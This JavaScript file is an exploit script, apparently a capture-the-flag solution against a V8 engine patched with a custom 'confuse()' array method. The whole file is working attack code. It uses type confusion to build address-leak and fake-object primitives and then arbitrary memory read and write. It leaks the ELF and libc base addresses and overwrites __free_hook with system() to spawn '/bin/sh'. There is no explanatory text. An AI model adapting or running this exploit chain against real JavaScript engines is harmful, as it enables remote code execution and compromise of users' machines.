var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var float_arr = [1.1, 1.2, 1.3, 1.4];

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function pack(v0, v1) {
    u64_buf[0] = v0
    u64_buf[1] = v1
    return f64_buf[0]
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hexify(val) {
    return '0x' + val.toString(16).padStart(16, '0');
}

let fake_obj_arr = ["abc", "def"];

function get_addr(obj) {
    fake_obj_arr[0] = obj;
    fake_obj_arr.confuse();
    let val = ftoi(fake_obj_arr[0]);
    fake_obj_arr.confuse();
    fake_obj_arr[0] = "abc";
    return val & 0xffffffffn;
}

let fake_float_arr = [1.1, 2.2];

function fake_obj(addr) {
    fake_float_arr[0] = itof(addr);
    fake_float_arr.confuse();
    let fake = fake_float_arr[0];
    fake_float_arr.confuse();
    fake_float_arr[0] = 1.1;
    return fake;
}


function arbRead(addr){
    var crafted_arr = [itof(0x1cb86dn), 2.2, 3.3, 4.4];
    var fake = fake_obj(get_addr(crafted_arr)-0x20n);
    if (addr % 2n == 0)
        addr += 1n;
    // %DebugPrint(crafted_arr);
    crafted_arr[1] = pack(Number(BigInt(addr)) - 8, 8);
    crafted_arr[2] = pack(0x4, 0x56d);
    // %DebugPrint(fake);
    return ftoi(fake[0]);
}

function arbReadv2(addr){
    let vuln = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7];
    vuln[0] = pack(0x00000000001c87b9, 0x725);
    vuln[1] = pack(0x725, 0x0);
    vuln[2] = pack(0x69, 0x1000);
    vuln[3] = pack(0x0, 0x1000);
    vuln[4] = pack(0x0, Number(BigInt(addr) & 0xffffffffn));
    vuln[5] = pack(Number(BigInt(addr) >> 32n), 0x80040);
    vuln[6] = pack(0x69, 0x2);
    // %DebugPrint(vuln);
    console.log("[+] Vuln Base Address: ", hexify(get_addr(vuln)));
    var fake = fake_obj(get_addr(vuln) - 0x40n + 0x8n);
    // %DebugPrint(fake);
    let dataview = new DataView(fake);
    return dataview.getBigUint64(0, true);
}

function arbWrite(addr, val){
    let vuln = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7];
    vuln[0] = pack(0x00000000001c87b9, 0x725);
    vuln[1] = pack(0x725, 0x0);
    vuln[2] = pack(0x69, 0x1000);
    vuln[3] = pack(0x0, 0x1000);
    vuln[4] = pack(0x0, Number(BigInt(addr) & 0xffffffffn));
    vuln[5] = pack(Number(BigInt(addr) >> 32n), 0x80040);
    vuln[6] = pack(0x69, 0x2);
    // %DebugPrint(vuln);    
    var fake = fake_obj(get_addr(vuln) - 0x40n + 0x8n);
    // %DebugPrint(fake);
    let dataview = new DataView(fake);
    dataview.setBigUint64(0, BigInt(val), true);
}


elf_addr = arbRead(0x40028n) - 0x11ae800n;
console.log("[+] ELF Base Address: " + hexify(elf_addr));

libc_addr = arbReadv2(elf_addr + 0x290b550n) - 0x61c90n;
console.log("[+] Libc Base Address: " + hexify(libc_addr));
free_hook = libc_addr + 0x1eee48n;
system = libc_addr + 0x52290n;

arbWrite(free_hook, system);
console.log("/bin/sh\x00");